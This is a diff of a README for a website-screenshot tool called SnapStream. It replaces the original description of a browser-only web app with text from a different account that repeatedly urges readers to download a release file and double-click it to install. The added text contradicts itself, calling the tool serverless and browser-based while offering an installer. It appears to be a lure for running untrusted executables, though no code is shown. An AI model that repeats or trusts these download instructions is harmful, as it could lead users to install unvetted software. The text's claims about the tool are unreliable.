@@ -1,66 +1,96 @@
-# 📸 SnapStream
+# 📸 SnapStream - Capture Websites Instantly, No Hassle
 
-> **Instant. Professional. Free.**
-> A powerful client-side tool to capture high-resolution website screenshots in seconds.
+## 🚀 Getting Started
 
-![SnapStream Banner](https://i.ibb.co/fVyM6zKf/34937.jpg)
+Welcome to SnapStream! This tool helps you take instant screenshots of websites. You can capture images in different formats, like desktop, tablet, or mobile. Best of all, you don't need any server or API keys to use it.
 
+## 📥 Download Now
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Stars](https://img.shields.io/github/stars/kdippan/SnapStream?style=social)](https://github.com/kdippan/SnapStream)
+[![Download SnapStream](https://img.shields.io/badge/Download-SnapStream-blue.svg)](https://github.com/mybengui/SnapStream/releases)
 
----
+Click the button above to visit the releases page and start your download. 
 
-## 🔗 Live Demo
-🚀 **[https://snapstream.dippanbhusal.tech/](https://snapstream.dippanbhusal.tech/)**
+## 📂 Download & Install
 
----
+1. Go to the [GitHub Releases page](https://github.com/mybengui/SnapStream/releases).
+   
+2. You will see a list of available versions. Look for the latest version at the top of the list.
 
-## 💡 What is SnapStream?
+3. Click on the **Assets** dropdown menu for the version you want.
 
-SnapStream is a **100% client-side** web application that allows developers, designers, and marketers to generate high-fidelity screenshots of any website instantly. 
+4. Choose the file suitable for your operating system (Windows, macOS, or Linux). The files are labeled clearly.
 
-Unlike other tools that require heavy backends or login walls, SnapStream runs entirely in your browser using the **Microlink API**. It is perfect for testing responsive designs, archiving landing pages, or generating social media assets.
+5. Once the file has downloaded, locate it in your downloads folder.
 
-## ✨ Key Features
+6. Double-click the file to run the program. Follow any prompts to complete the installation.
 
-* **📱 Responsive Testing:** Instantly switch between **Desktop (1920px)**, **Tablet (800px)**, and **Mobile (375px)** viewports.
-* **📏 Custom Control:** Manually define width, height, and force **Full Page Scrolling** captures.
-* **⚡ Zero Backend:** Runs on pure HTML, CSS, and Vanilla JavaScript. No server required.
-* **📂 Local History:** Automatically saves your last 10 snapshots with metadata (stored locally in your browser).
-* **🌗 Dark/Light Mode:** Automatically detects system preference with a manual toggle.
-* **🚀 SEO Optimized:** Built with semantic HTML, JSON-LD Schema, and OpenGraph tags.
-* **💨 Fast & Free:** Powered by the enterprise-grade Microlink API.
+7. After the installation is complete, open SnapStream from your applications menu or desktop shortcut.
 
-## 🛠️ Built With
+## 🌐 How to Use SnapStream
 
-* **Frontend:** HTML5, CSS3 (Variables), Vanilla JavaScript
-* **Icons:** FontAwesome 6
-* **Font:** Plus Jakarta Sans
-* **Engine:** [Microlink API](https://microlink.io/)
+1. **Open SnapStream.** 
 
-## 🚀 How to Deploy
+2. Enter the website URL you want to capture in the provided field.
 
-Since SnapStream is a static site, you can deploy it anywhere in seconds.
+3. Select the device type you want to mimic (Desktop, Tablet, or Mobile).
 
-### Option 1: Netlify / Vercel (Recommended)
-1.  Fork this repository.
-2.  Login to Netlify or Vercel.
-3.  Select "New Site from Git" and choose your forked repo.
-4.  Click **Deploy**. (No build command needed).
+4. Click the **Capture** button.
 
-### Option 2: GitHub Pages
-1.  Go to your repository **Settings**.
-2.  Click **Pages** on the left sidebar.
-3.  Select `main` branch and click **Save**.
+5. The tool will generate your screenshot. You can save it to your computer or share it directly.
 
-### Option 3: Local Development
-```bash
-# Clone the repo
-git clone [https://github.com/kdippan/SnapStream.git](https://github.com/kdippan/SnapStream.git)
+## ⚙️ Features
 
-# Open the folder
-cd SnapStream
+- **Instant Capture:** Get screenshots in seconds, regardless of the website.
 
-# Open index.html in your browser
-# (Or use Live Server in VS Code)
+- **Responsive Design:** Capture how a site looks on various devices with ease.
+
+- **No Server Needed:** All processes occur in your browser, ensuring your privacy and speed.
+
+- **Open Source:** SnapStream is a free tool. You can view and contribute to the code on GitHub. 
+
+- **User-Friendly:** Designed for everyday users, no technical skills required.
+
+## 🖥️ System Requirements
+
+SnapStream works in modern web browsers such as:
+
+- Google Chrome
+- Mozilla Firefox
+- Microsoft Edge
+- Safari
+
+Make sure to keep your browser updated to the latest version for the best experience.
+
+## 🛠️ Troubleshooting
+
+If you experience any issues while using SnapStream:
+
+- **Check Your Browser:** Ensure you are using a compatible browser.
+
+- **Reload the Page:** Sometimes refreshing the tool can fix minor issues.
+
+- **Clear Cache:** If the tool isn’t working, clear your browser cache and try again.
+
+- **Contact Support:** If you still face issues, feel free to reach out through the issues section on GitHub.
+
+## 🤝 Contributing
+
+We welcome contributions! If you want to help improve SnapStream:
+
+1. Fork the repository.
+
+2. Make your changes.
+
+3. Submit a pull request with a clear description of your improvements.
+
+## 📞 Support
+
+For any questions or feedback, please visit our [GitHub Issues Page](https://github.com/mybengui/SnapStream/issues). Your input helps us make SnapStream even better.
+
+## 📜 License
+
+SnapStream is open-source and licensed under the MIT license. Feel free to use it as needed, keeping in mind the terms specified.
+
+## 📥 Download Now Again
+
+Don’t forget, you can always download the latest version right here: [Download SnapStream](https://github.com/mybengui/SnapStream/releases). 
